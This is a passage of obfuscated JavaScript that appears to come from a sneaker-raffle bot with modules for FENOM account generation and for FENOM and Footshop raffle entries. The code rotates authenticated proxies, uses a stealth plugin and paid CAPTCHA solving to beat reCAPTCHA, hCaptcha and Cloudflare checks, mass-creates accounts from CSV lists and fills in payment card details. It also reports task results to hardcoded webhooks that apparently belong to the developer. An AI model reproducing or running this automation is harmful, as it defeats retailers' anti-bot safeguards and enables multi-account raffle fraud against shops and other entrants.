                            _0x174aff == 'yes' && _0xa6187f >= 0x5 && (_0x17fcb0(_0x18febf[_0x50e084], _0x1309f7), _0x174aff = 'no', _0xa6187f = 0x0), console['log'](_0x1c7496() + '\x20[' + _0x1309f7['name'] + ']\x20Waiting\x20for\x20' + _0x15bf3f['delay'] + '\x20ms'), await _0x37731a(_0x15bf3f['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x3d65bb, _0x14e8f2, _0x582b80) {
                    _0x3df2da['use'](_0x6b6409()), _0x3df2da['use'](_0x371b3c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x15bf3f['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x333c64 = 0x0; _0x333c64 < _0x14e8f2['length']; _0x333c64++) {
                        if (_0x29d572 != 'yes')
                            var _0x29d572 = '', _0x5e876e = 0x0;
                        var _0x140d4e;
                        try {
                            await _0x412246(_0x14e8f2, _0x333c64);
                        } catch {
                            _0x29d572 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x57fa03(_0x3d65bb['name'] + '\x20Task\x20' + (_0x333c64 + 0x1) + '\x20/\x20' + _0x14e8f2['length'] + '\x20||\x20File:\x20' + _0x5b46f0 + '\x20Proxies:\x20' + _0x519e9c);
                        var _0x4d3ffb = await _0x5c5001(_0x14e8f2[_0x333c64], _0x3d65bb, 'acc', ![]);
                        const _0x53ac43 = { 'succesDEVMSG': { 'embeds': [_0x4d3ffb] } }, _0x27b9fa = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x3038c1 = Math['round'](Math['random']() * (_0x582b80['length'] - 0x1)), _0x28d5da = _0x582b80[_0x3038c1]['split'](':'), _0x153650;
                        try {
                            _0x153650 = await _0x3df2da['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x28d5da[0x0] + ':' + _0x28d5da[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x153650 = await _0x3df2da['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x28d5da[0x0] + ':' + _0x28d5da[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xf5d1b0 = await _0x153650['newPage']();
                            await _0xf5d1b0['setViewport']({
                                'width': 0x500 + _0x413f8d(0x1, 0x32),
                                'height': 0x2d9 + _0x413f8d(0x1, 0x32)
                            });
                            const _0x15a13f = await _0xf5d1b0['target']()['createCDPSession'](), { windowId: _0x4102a7 } = await _0x15a13f['send']('Browser.getWindowForTarget');
                            await _0xf5d1b0['authenticate']({
                                'username': '' + _0x28d5da[0x2],
                                'password': '' + _0x28d5da[0x3]
                            }), console['log'](_0x1c7496() + '\x20[' + _0x3d65bb['name'] + ']\x20Task\x20' + (_0x333c64 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xf5d1b0['goto']('' + _0x27b9fa, { 'waitUntil': 'networkidle2' }), await _0x37731a(0x1388), console['log'](_0x1c7496() + '\x20[' + _0x3d65bb['name'] + ']\x20Task\x20' + (_0x333c64 + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            try {
                                const _0xda27c1 = await _0xf5d1b0['$eval']('input[value=\x22Verify\x20you\x20are\x20human\x22]');
                                _0xda27c1 && await _0xda27c1['click']();
                            } catch {
                            }
                            await _0x15a13f['send']('Browser.setWindowBounds', {
                                'windowId': _0x4102a7,
                                'bounds': { 'windowState': 'minimized' }
                            });
                            try {
                                await _0xf5d1b0['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x37731a(0xfa0);
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            console['log'](_0x1c7496() + '\x20[' + _0x3d65bb['name'] + ']\x20Task\x20' + (_0x333c64 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0xf5d1b0['type']('input[name=\x22firstname\x22]', '' + _0x14e8f2[_0x333c64]['FirstName']), await _0x37731a(0x1f4), await _0xf5d1b0['type']('input[name=\x22lastname\x22]', '' + _0x14e8f2[_0x333c64]['LastName']), await _0x37731a(0x1f4), await _0xf5d1b0['type']('input[name=\x22email\x22]', '' + _0x14e8f2[_0x333c64]['Email']), await _0x37731a(0x1f4), await _0xf5d1b0['type']('input[name=\x22password\x22]', '' + _0x14e8f2[_0x333c64]['Password']), await _0x37731a(0x258), await _0xf5d1b0['$eval']('input[name=\x22psgdpr\x22]', _0x4826c2 => _0x4826c2['click']()), await _0x37731a(0x1f4), console['log'](_0x1c7496() + '\x20[' + _0x3d65bb['name'] + ']\x20Task\x20' + (_0x333c64 + 0x1) + '\x20:\x20Sending\x20Request'), await _0xf5d1b0['$eval']('#customer-form', _0x5f4f6b => _0x5f4f6b['submit']());
                            try {
                                try {
                                    await _0xf5d1b0['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                } catch {
                                    throw new Error('Succes-response\x20not\x20found');
                                }
                                _0x29d572 = 'no', console['log'](_0x7ff36['green'](_0x1c7496() + '\x20[' + _0x3d65bb['name'] + ']\x20Task\x20' + (_0x333c64 + 0x1) + '\x20:\x20Account\x20' + _0x14e8f2[_0x333c64]['Email'] + '\x20Generated')), _0x241ca2['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x14e8f2[_0x333c64]['Email'] + ',' + _0x14e8f2[_0x333c64]['Password']);
                                try {
                                    _0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '' && await _0x4160b0(_0x15bf3f['webhook'], _0x53ac43['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4160b0(_0x14c79a, _0x53ac43['succesDEVMSG']);
                            } catch (_0x462725) {
                                throw new Error('Account\x20generation\x20failed');
                            }
                        } catch (_0x4a09ad) {
                            console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x3d65bb['name'] + ']\x20Task\x20' + (_0x333c64 + 0x1) + '\x20:\x20' + _0x4a09ad)), _0x140d4e = '' + _0x4a09ad;
                            var _0x512287 = await _0x5c5001(_0x14e8f2[_0x333c64], _0x3d65bb, 'acc', !![], _0x140d4e);
                            _0x53ac43['errorDEV'] = { 'embeds': [_0x512287] }, _0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '' && await _0x4160b0(_0x15bf3f['webhook'], _0x53ac43['errorDEV']), await _0x4160b0(_0x3ce78e, _0x53ac43['errorDEV']), _0x29d572 = 'yes';
                        } finally {
                            _0x153650['close']();
                            if (_0x29d572 == 'yes' && _0x5e876e != 0x5 && _0x140d4e != 'Size\x20Not\x20Found') {
                                console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x3d65bb['name'] + ']\x20Task\x20' + (_0x333c64 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5e876e + '\x20/\x205)')), _0x333c64 = _0x333c64 - 0x1, _0x5e876e = _0x5e876e + 0x1;
                                continue;
                            }
                            _0x29d572 == 'yes' && _0x5e876e >= 0x5 && (_0x17fcb0(_0x14e8f2[_0x333c64], _0x3d65bb), _0x29d572 = 'no', _0x5e876e = 0x0), console['log'](_0x1c7496() + '\x20[' + _0x3d65bb['name'] + ']\x20Waiting\x20for\x20' + _0x15bf3f['delay'] + '\x20ms'), await _0x37731a(_0x15bf3f['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x3e7f4b(_0x52829e, _0x2a9b1f, _0x2fc972) {
                    _0x3df2da['use'](_0x6b6409()), _0x3df2da['use'](_0x371b3c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x15bf3f['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xb8af7 = 0x0; _0xb8af7 < _0x2a9b1f['length']; _0xb8af7++) {
                        if (_0xfc19af != 'yes')
                            var _0xfc19af = '', _0x113240 = 0x0;
                        var _0x23a3ff;
                        try {
                            await _0x412246(_0x2a9b1f, _0xb8af7);
                        } catch {
                            _0xfc19af = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x57fa03(_0x52829e['name'] + '\x20Task\x20' + (_0xb8af7 + 0x1) + '\x20/\x20' + _0x2a9b1f['length'] + '\x20||\x20File:\x20' + _0x5b46f0 + '\x20Proxies:\x20' + _0x519e9c);
                        const _0xc38e3b = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x183960 = Math['round'](Math['random']() * (_0x2fc972['length'] - 0x1)), _0x37112b = _0x2fc972[_0x183960]['split'](':'), _0x49489c;
                        try {
                            _0x49489c = await _0x3df2da['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x37112b[0x0] + ':' + _0x37112b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x49489c = await _0x3df2da['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x37112b[0x0] + ':' + _0x37112b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x626d6a = await _0x49489c['newPage'](), _0x24fde4 = await _0x626d6a['target']()['createCDPSession'](), { windowId: _0x27354a } = await _0x24fde4['send']('Browser.getWindowForTarget');
                            await _0x626d6a['authenticate']({
                                'username': '' + _0x37112b[0x2],
                                'password': '' + _0x37112b[0x3]
                            }), console['log'](_0x1c7496() + '\x20[' + _0x52829e['name'] + ']\x20Task\x20' + (_0xb8af7 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x626d6a['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x1c7496() + '\x20[' + _0x52829e['name'] + ']\x20Task\x20' + (_0xb8af7 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x37731a(0xbb8), await _0x24fde4['send']('Browser.setWindowBounds', {
                                'windowId': _0x27354a,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x37731a(0x1f40);
                            try {
                                await _0x626d6a['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x37731a(0x1388), console['log'](_0x1c7496() + '\x20[' + _0x52829e['name'] + ']\x20Task\x20' + (_0xb8af7 + 0x1) + '\x20:\x20Logging\x20in'), await _0x626d6a['type']('input[name=\x22email\x22]', '' + _0x2a9b1f[_0xb8af7]['Email']), await _0x37731a(0x1f4), await _0x626d6a['type']('input[name=\x22password\x22]', '' + _0x2a9b1f[_0xb8af7]['Password']), await _0x37731a(0x258), await _0x626d6a['$eval']('#login-form', _0x163d7c => _0x163d7c['submit']()), await _0x626d6a['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x37731a(0x1f4), await _0x626d6a['goto']('' + _0x2a9b1f[_0xb8af7]['Url']), await _0x626d6a['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x1c7496() + '\x20[' + _0x52829e['name'] + ']\x20Task\x20' + (_0xb8af7 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x2a9b1f[_0xb8af7]['Size']);
                            if (_0x2a9b1f[_0xb8af7]['Size'] != 'RANDOM') {
                                var _0x94f629 = '\x20' + _0x2a9b1f[_0xb8af7]['Size'] + '\x20';
                                const _0x205d0a = await _0x626d6a['$x']('//span[contains(text(),\x20' + _0x94f629 + ')]');
                                await _0x205d0a[0x0]['click']();
                            } else {
                                const _0x588ad1 = await _0x626d6a['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x1d4eaa = Math['round'](Math['random']() * (_0x588ad1['length'] - 0x1));
                                await _0x588ad1[_0x1d4eaa]['click']();
                            }
                            await _0x37731a(0x258), await _0x626d6a['click']('#cookieChoiceDismiss'), await _0x37731a(0x3e8), await _0x626d6a['type']('#instagram-account', '' + _0x2a9b1f[_0xb8af7]['Follower']), await _0x37731a(0x28a), await _0x626d6a['click']('#book-btn'), await _0x37731a(0xbb8);
                            try {
                                await _0x626d6a['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x37731a(0x1f4), console['log'](_0x1c7496() + '\x20[' + _0x52829e['name'] + ']\x20Task\x20' + (_0xb8af7 + 0x1) + '\x20:\x20' + _0x7ff36['cyan']('Solving\x20Captcha')), await _0x626d6a['solveRecaptchas'](), console['log'](_0x1c7496() + '\x20[' + _0x52829e['name'] + ']\x20Task\x20' + (_0xb8af7 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x37731a(0x7d0), await _0x626d6a['$eval']('#book-btn-for-sure', _0x15f943 => _0x15f943['click']()), await _0x37731a(0x12c), await _0x626d6a['click']('#book-btn-for-sure'), await _0x37731a(0xdac);
                            const _0x5269c6 = await _0x626d6a['$eval']('.reservation-popup\x20>\x20.title', _0x561cd6 => {
                                return _0x561cd6['innerHTML'];
                            });
                            if (_0x5269c6) {
                                _0xfc19af = 'no', _0x5879e0(_0x2a9b1f[_0xb8af7], _0x52829e), console['log'](_0x7ff36['green'](_0x1c7496() + '\x20[' + _0x52829e['name'] + ']\x20Task\x20' + (_0xb8af7 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x1f09a5 = await _0x5c5001(_0x2a9b1f[_0xb8af7], _0x52829e, 'dev', ![]), _0x1c7185 = await _0x5c5001(_0x2a9b1f[_0xb8af7], _0x52829e, 'pub', ![]);
                                const _0x136790 = {
                                    'succesDEVMSG': { 'embeds': [_0x1f09a5] },
                                    'succesPUBMSG': { 'embeds': [_0x1c7185] }
                                };
                                try {
                                    _0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '' && await _0x4160b0(_0x15bf3f['webhook'], _0x136790['succesDEVMSG']), await _0x37731a(0xc8), await _0x4160b0(_0x4ebf40, _0x136790['succesDEVMSG']), await _0x37731a(0xc8), await _0x4160b0(_0xd6338c, _0x136790['succesPUBMSG']);
                                } catch (_0x372dbb) {
                                    console['log'](_0x7ff36['yellow'](_0x1c7496() + '\x20[' + _0x52829e['name'] + ']\x20Task\x20' + (_0xb8af7 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x372dbb));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x99469a) {
                            console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x52829e['name'] + ']\x20Task\x20' + (_0xb8af7 + 0x1) + '\x20:\x20' + _0x99469a)), _0x23a3ff = '' + _0x99469a;
                            var _0x19b11a = await _0x5c5001(_0x2a9b1f[_0xb8af7], _0x52829e, 'dev', !![], _0x23a3ff), _0x1f09a5 = await _0x5c5001(_0x2a9b1f[_0xb8af7], _0x52829e, 'dev', ![]), _0x1c7185 = await _0x5c5001(_0x2a9b1f[_0xb8af7], _0x52829e, 'pub', ![]);
                            const _0x2ba027 = {
                                'succesDEVMSG': { 'embeds': [_0x1f09a5] },
                                'succesPUBMSG': { 'embeds': [_0x1c7185] }
                            };
                            _0x2ba027['errorDEV'] = { 'embeds': [_0x19b11a] }, _0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '' && await _0x4160b0(_0x15bf3f['webhook'], _0x2ba027['errorDEV']), await _0x4160b0(_0x3ce78e, _0x2ba027['errorDEV']), _0x99469a != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0xfc19af = 'yes');
                        } finally {
                            _0x49489c['close']();
                            if (_0xfc19af == 'yes' && _0x113240 != 0x5 && _0x23a3ff != 'Size\x20Not\x20Found') {
                                console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x52829e['name'] + ']\x20Task\x20' + (_0xb8af7 + 0x1) + '\x20:\x20Retrying\x20(' + _0x113240 + '\x20/\x205)')), _0xb8af7 = _0xb8af7 - 0x1, _0x113240 = _0x113240 + 0x1;
                                continue;
                            }
                            _0xfc19af == 'yes' && _0x113240 >= 0x5 && (_0x17fcb0(_0x2a9b1f[_0xb8af7], _0x52829e), _0xfc19af = 'no', _0x113240 = 0x0), console['log'](_0x1c7496() + '\x20[' + _0x52829e['name'] + ']\x20Waiting\x20for\x20' + _0x15bf3f['delay'] + '\x20ms'), await _0x37731a(_0x15bf3f['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x258efe, _0x4d587c, _0x4c250f) {
                _0x3df2da['use'](_0x6b6409()), _0x3df2da['use'](_0x371b3c({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x15bf3f['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x516106 = 0x0; _0x516106 < _0x4d587c['length']; _0x516106++) {
                    var _0x3d1868;
                    if (_0x3895d1 != 'yes')
                        var _0x3895d1 = '', _0x374fa2 = 0x0;
                    var _0x65b11c = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x6362be
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x4d587c[_0x516106]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x4d587c[_0x516106]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x15bf3f['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x2bd99c
                            }
                        ]
                    }], _0x4951bd = await _0x5c5001(_0x4d587c[_0x516106], _0x258efe, 'dev', ![]), _0x37889e = await _0x5c5001(_0x4d587c[_0x516106], _0x258efe, 'pub', ![]);
                    const _0x480d67 = {
                        'succesDEVMSG': { 'embeds': [_0x4951bd] },
                        'succesPUBMSG': { 'embeds': [_0x37889e] }
                    }, _0x171acd = { 'embeds': _0x65b11c };
                    try {
                        await _0x412246(_0x4d587c, _0x516106);
                    } catch {
                        _0x3895d1 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x4d587c[_0x516106]['Email'] == '' || _0x4d587c[_0x516106]['FirstName'] == '' || _0x4d587c[_0x516106]['LastName'] == '' || _0x4d587c[_0x516106]['Country'] == '' || _0x4d587c[_0x516106]['Size'] == '' || _0x4d587c[_0x516106]['Address1'] == '' || _0x4d587c[_0x516106]['Zip'] == '') {
                        console['log'](_0x1c7496() + '\x20[' + _0x258efe['name'] + ']\x20Task\x20' + (_0x516106 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x4d587c[_0x516106]['Email'] == '' || _0x4d587c[_0x516106]['FirstName'] == '' || _0x4d587c[_0x516106]['LastName'] == '' || _0x4d587c[_0x516106]['Country'] == '' || _0x4d587c[_0x516106]['Size'] == '' || _0x4d587c[_0x516106]['Address1'] == '' || _0x4d587c[_0x516106]['Zip'] == '' || _0x4d587c[_0x516106]['Phone'] == '') {
                        console['log'](_0x1c7496() + '\x20[' + _0x258efe['name'] + ']\x20Task\x20' + (_0x516106 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x326f21 = '' + _0x4d587c[_0x516106]['Url'];
                    if (_0x15bf3f['useRandomProxy'] = ![])
                        var _0xb35e89 = _0x4c250f[_0x516106]['split'](':');
                    else
                        var _0x971a30 = Math['round'](Math['random']() * (_0x4c250f['length'] - 0x1)), _0xb35e89 = _0x4c250f[_0x971a30]['split'](':');
                    const _0x351160 = await _0x3df2da['launch']({
                        'headless': !![],
                        'args': ['--proxy-server=' + _0xb35e89[0x0] + ':' + _0xb35e89[0x1]]
                    });
                    try {
                        const _0x32a3aa = await _0x351160['newPage']();
                        await _0x32a3aa['authenticate']({
                            'username': '' + _0xb35e89[0x2],
                            'password': '' + _0xb35e89[0x3]
                        }), console['log'](_0x1c7496() + '\x20[' + _0x258efe['name'] + ']\x20Task\x20' + (_0x516106 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x32a3aa['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x32a3aa['setRequestInterception'](!![]), _0x32a3aa['on']('request', _0x7897ee => {
                            _0x7897ee['resourceType']() === 'image' || _0x7897ee['resourceType']() === 'font' || _0x7897ee['resourceType']() === 'media' ? _0x7897ee['abort']() : _0x7897ee['continue']();
                        });
                        try {
                            await _0x32a3aa['goto'](_0x326f21), await _0x37731a(0xbb8), await _0x32a3aa['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x32a3aa['click']('.control__JhutY'), await _0x37731a(0x1f4);
                        if (_0x4d587c[_0x516106]['Size'] != 'RANDOM')
                            try {
                                const _0x5c59c8 = await _0x32a3aa['$x']('//div[contains(text(),\x20\x27' + _0x4d587c[_0x516106]['Size'] + '\x27)]');
                                await _0x5c59c8[0x0]['click']();
                            } catch {
                                console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x258efe['name'] + ']\x20Task\x20' + (_0x516106 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x1af134 = await _0x32a3aa['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x33fbb3 = Math['round'](Math['random']() * (_0x1af134['length'] - 0x1));
                            await _0x1af134[_0x33fbb3]['click']();
                        }
                        await _0x37731a(0x4b0);
                        const _0x1c6cac = await _0x32a3aa['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x1c6cac[0x0]['click'](), await _0x32a3aa['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x1c7496() + '\x20[' + _0x258efe['name'] + ']\x20Task\x20' + (_0x516106 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x32a3aa['type']('input[name=\x22email\x22]', '' + _0x4d587c[_0x516106]['Email']), await _0x37731a(0x640), await _0x32a3aa['type']('input[name=\x22phone\x22]', '' + _0x4d587c[_0x516106]['Phone']), await _0x37731a(0x4b0), await _0x32a3aa['click']('button.btn.continue-button__1RtsS'), await _0x37731a(0x4b0);
                        try {
                            await _0x32a3aa['type']('input[name=\x22firstName\x22]', '' + _0x4d587c[_0x516106]['FirstName']), await _0x37731a(0x258);
                        } catch {
                            const _0x5a293d = await _0x32a3aa['$$eval']('.invalid-feedback\x20>\x20div', _0x3b4f2a => {
                                return _0x3b4f2a['map'](_0x54d772 => _0x54d772['innerText']);
                            });
                            console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x258efe['name'] + ']\x20Task\x20' + (_0x516106 + 0x1) + '\x20:\x20' + _0x5a293d));
                            continue;
                        }
                        await _0x32a3aa['type']('input[name=\x22lastName\x22]', '' + _0x4d587c[_0x516106]['LastName']), await _0x37731a(0xc8), await _0x32a3aa['type']('input[name=\x22instagramUsername\x22]', '' + _0x4d587c[_0x516106]['Follower']), await _0x37731a(0x4b0), await _0x32a3aa['click']('button.btn.continue-button__1RtsS'), await _0x37731a(0x3e8), console['log'](_0x1c7496() + '\x20[' + _0x258efe['name'] + ']\x20Task\x20' + (_0x516106 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x32a3aa['select']('select[name=\x22country\x22]', '' + _0x4d587c[_0x516106]['Country']), await _0x37731a(0x2bc), await _0x32a3aa['type']('input[name=\x22streetName\x22]', '' + _0x4d587c[_0x516106]['Address1']), await _0x37731a(0x258), await _0x32a3aa['type']('input[name=\x22houseNumber\x22]', _0x4d587c[_0x516106]['HouseNumber'] + '\x20' + _0x4d587c[_0x516106]['Address2']), await _0x37731a(0xc8), await _0x32a3aa['type']('input[name=\x22postalCode\x22]', '' + _0x4d587c[_0x516106]['Zip']), await _0x37731a(0x1f4), await _0x32a3aa['type']('input[name=\x22city\x22]', '' + _0x4d587c[_0x516106]['City']), await _0x37731a(0x4b0), await _0x32a3aa['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x37731a(0x4b0), await _0x32a3aa['click']('button.btn.continue-button__1RtsS'), await _0x37731a(0x4b0), console['log'](_0x1c7496() + '\x20[' + _0x258efe['name'] + ']\x20Task\x20' + (_0x516106 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x32a3aa['solveRecaptchas'](), console['log'](_0x1c7496() + '\x20[' + _0x258efe['name'] + ']\x20Task\x20' + (_0x516106 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x37731a(0xbb8), await _0x32a3aa['click']('button.btn.continue-button__1RtsS'), await _0x37731a(0x1388), console['log'](_0x1c7496() + '\x20[' + _0x258efe['name'] + ']\x20Task\x20' + (_0x516106 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x32a3aa['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x32a3aa['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x37731a(0x4b0), await _0x32a3aa['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x4d587c[_0x516106]['CardNumber']), await _0x37731a(0x320), await _0x32a3aa['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x32a3aa['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x4d587c[_0x516106]['ExpiryDate']), await _0x37731a(0x4b0), await _0x32a3aa['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x32a3aa['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x4d587c[_0x516106]['CVV']), await _0x37731a(0x226), await _0x32a3aa['type']('input[name=\x22holderName\x22]', '' + _0x4d587c[_0x516106]['NameOnCard']), await _0x37731a(0x226), await _0x32a3aa['click']('button.adyen-checkout__button'), console['log'](_0x1c7496() + '\x20[' + _0x258efe['name'] + ']\x20Task\x20' + (_0x516106 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x32a3aa['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x37731a(0xbb8);
                        } catch (_0x11eb95) {
                            console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x258efe['name'] + ']\x20Task\x20' + (_0x516106 + 0x1) + '\x20:\x203DS\x20Failed')), _0x3d1868 = '3DS\x20Error\x20' + _0x11eb95;
                            var _0x197c07 = await _0x5c5001(_0x4d587c[_0x516106], _0x258efe, 'dev', !![], _0x3d1868);
                            _0x480d67['errorDEV'] = { 'embeds': [_0x197c07] };
                            _0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '' && await _0x4160b0(_0x15bf3f['webhook'], _0x480d67['errorDEV']);
                            await _0x4160b0(_0x3ce78e, _0x480d67['errorDEV']);
                            continue;
                        }
                        _0x5879e0(_0x4d587c[_0x516106], _0x258efe), console['log'](_0x7ff36['green'](_0x1c7496() + '\x20[' + _0x258efe['name'] + ']\x20Task\x20' + (_0x516106 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        if (_0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '')
                            try {
                                await _0x4160b0(_0x15bf3f['webhook'], _0x480d67['succesDEVMSG']);
                            } catch {
                            }
                        await _0x37731a(0xc8), await _0x4160b0(_0x4ebf40, _0x480d67['succesDEVMSG']), await _0x37731a(0xc8);
                        try {
                            await _0x4160b0(_0xd6338c, _0x480d67['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x2c1e37) {
                        console['log'](_0x1c7496() + '\x20[' + _0x258efe['name'] + ']\x20Task\x20' + (_0x516106 + 0x1) + '\x20:\x20' + _0x2c1e37), _0x3d1868 = '' + _0x2c1e37;
                        var _0x197c07 = await _0x5c5001(_0x4d587c[_0x516106], _0x258efe, 'dev', !![], _0x3d1868);
                        _0x480d67['errorDEV'] = { 'embeds': [_0x197c07] }, _0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '' && await _0x4160b0(_0x15bf3f['webhook'], _0x480d67['errorDEV']), await _0x4160b0(_0x3ce78e, _0x480d67['errorDEV']), _0x3895d1 = 'yes';
                    } finally {
                        _0x351160['close']();
                        if (_0x3895d1 == 'yes' && _0x374fa2 != 0x5) {
